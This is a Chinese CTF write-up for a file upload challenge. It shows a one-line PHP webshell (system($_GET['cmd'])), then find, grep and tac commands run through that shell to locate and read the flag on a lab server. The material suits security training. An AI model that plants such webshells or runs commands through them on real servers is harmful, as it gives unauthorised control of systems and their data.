本题考察的是 Web 安全中经典的任意文件上传漏洞。目标是通过上传恶意脚本文件（WebShell），绕过服务器的安全检查，从而获取服务器控制权并读取 Flag。

<!--more-->

# 解题步骤

## 1\. 信息收集与漏洞发现

- 访问题目提供的 URL，发现一个简单的文件上传接口。

- 测试上传功能时，尝试上传一个包含 PHP 代码的文件，发现服务器未对文件后缀名进行校验（允许上传 \`\.php\` 文件）。

- 确认存在任意文件上传漏洞。

## 2\. 构造并上传 WebShell

由于服务器没有过滤文件类型，我们可以直接上传一句话木马。

### • 木马代码：

```php
<?php system($_GET['cmd']);
```

### • 代码解释：

- \`$\_GET\['cmd']\`：接收浏览器地址栏传递的参数 \`cmd\`。

- \`system\(\.\.\.\)\`：调用系统命令执行函数，将接收到的参数交给操作系统执行。

### • 操作：

将上述代码保存为 \`shell\.php\` 并上传。

### • 结果：

上传成功，获得 WebShell 访问路径（例如 \`\.\.\./upload/shell\.php\`）。

## 3\. 查找 Flag 文件位置

虽然知道 Flag 在服务器上，但不知道具体文件名。使用系统命令进行搜索。

### • 尝试方法 A（按文件名搜索）：

使用 \`find\` 命令查找包含 flag 字样的文件。

```bash
http://[靶场地址]/upload/shell.php?cmd=find /var/www -name "*flag*"
```

### • 尝试方法 B（按文件内容搜索 \- 进阶）：

如果文件名被混淆，可以使用 \`grep\` 搜索文件内容中包含 \&ctfhub 的文件。

```bash
http://[靶场地址]/upload/shell.php?cmd=grep -r "ctfhub" /var/www/
```

### • 发现：

通过查找，定位到 Flag 文件路径为 \`/var/www/html/flag\_xxxxx\.php\`。

## 4\. 读取 Flag

找到文件后，不能直接在浏览器访问（因为它是 PHP 文件，会被执行而不是显示源码），必须使用系统命令读取其内容。

### • 命令尝试：

- 最初尝试使用 \`cat\` 命令，但因环境问题或缓存导致无回显。

- 随后使用 \`tac\` 命令（\`cat\` 的反向拼写，功能是反向输出文件内容）成功绕过潜在问题。

### • 最终 Payload：

```bash
http://[靶场地址]/upload/shell.php?cmd=tac%20/var/www/html/flag_xxxxx.php
```

\*\(注意：URL 中的空格需编码为 \`%20\`\)\*

# 最终结果

在响应体中成功获取 Flag：

```plaintext
ctfhub{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
```

# 知识点总结

- 文件上传漏洞：当服务器未严格校验上传文件的后缀名或内容时，攻击者可上传恶意脚本。

- WebShell 管理：利用 \`system\(\)\`、\`exec\(\)\` 等函数执行系统命令。

- Linux 常用命令：
        

    - \`find \[目录\] \-name  [文件名\] ：按名称查找文件。

    - \`grep \-r \[关键词\] \[目录\]\`：递归搜索文件内容。

    - \`cat/tac\`：查看文件内容。
